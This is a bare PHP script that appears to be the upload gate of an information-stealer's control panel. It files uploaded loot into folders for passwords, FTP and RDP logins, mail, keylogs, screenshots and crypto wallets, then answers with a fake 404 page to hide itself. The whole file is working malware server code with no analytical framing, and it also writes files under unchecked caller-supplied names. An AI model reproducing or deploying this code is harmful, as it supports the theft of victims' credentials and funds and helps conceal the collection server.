<?php

$location = "logs/";

$slots = $_REQUEST['slots'];
$allowed =  array('log','LOG','jpg','txt','TXT','TxT','html','wallet');

$pos = "log";
$pwd = "LOG";
$scr = "jpg";
$ftp = "txt";
$rdp = "TXT";
$mil = "TxT";
$kyl = "html";
$wst = ".wallet";


for ($num = 1; $num < $slots + 1; $num++)
  {
     if(in_array(end(explode(".", $_FILES['upload'.$num]['name'])),$allowed))
       {
        if ($_FILES['upload' . $num]['size'] > 0)
          {
            if (strpos($_FILES['upload' . $num]['name'], $pos) !== FALSE)
              {
                copy($_FILES['upload' . $num]['tmp_name'], $location . 'dump/' . $_FILES['upload' . $num]['name']);
              }
            else
              {
                if (strpos($_FILES['upload' . $num]['name'], $scr) !== FALSE)
                  {
                    copy($_FILES['upload' . $num]['tmp_name'], $location . 'scr/' . $_FILES['upload' . $num]['name']);
                  }
                else
                  {
                    if (strpos($_FILES['upload' . $num]['name'], $pwd) !== FALSE)
                      {
                        copy($_FILES['upload' . $num]['tmp_name'], $location . 'pass/' . $_FILES['upload' . $num]['name']);
                      }
                    else
                      {
                        if (strpos($_FILES['upload' . $num]['name'], $ftp) !== FALSE)
                          {
                            copy($_FILES['upload' . $num]['tmp_name'], $location . 'ftp/' . $_FILES['upload' . $num]['name']);
                          }
                        else
                          {
                            if (strpos($_FILES['upload' . $num]['name'], $rdp) !== FALSE)
                              {
                                copy($_FILES['upload' . $num]['tmp_name'], $location . 'rdp/' . $_FILES['upload' . $num]['name']);
                              }
                            else
                              {
                                if (strpos($_FILES['upload' . $num]['name'], $mil) !== FALSE)
                                  {
                                    copy($_FILES['upload' . $num]['tmp_name'], $location . 'mail/' . $_FILES['upload' . $num]['name']);
                                  }
                                else
                                  {
                                    if (strpos($_FILES['upload' . $num]['name'], $kyl) !== FALSE)
                                      {
                                        copy($_FILES['upload' . $num]['tmp_name'], $location . 'kyl/' . $_FILES['upload' . $num]['name']);
                                      }
                                    else
                                      {
                                        if (strpos($_FILES['upload'.$num]['name'], $wst) !== FALSE)
                                          {
                                             copy($_FILES['upload'.$num]['tmp_name'], $location.'wallet/'.$_FILES['upload'.$num]['name']);
                                          }
                                      }
                                  }
                              }
                          }
                      }
                  }
              }
          }
      }
  }


echo '
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ';
echo $_SERVER['PATH_TRANSLATED'];
echo '/ was not found on this server.</p>
<hr>
<address>';
echo $_SERVER['SERVER_SIGNATURE'];
echo ' Server at ';
echo $_SERVER['HTTP_HOST'];
echo ' Port ';
echo $_SERVER['SERVER_PORT'];
echo '</address>
</body></html>
';

function extension($str) 
{
   return end(explode(".", $str));
}

?>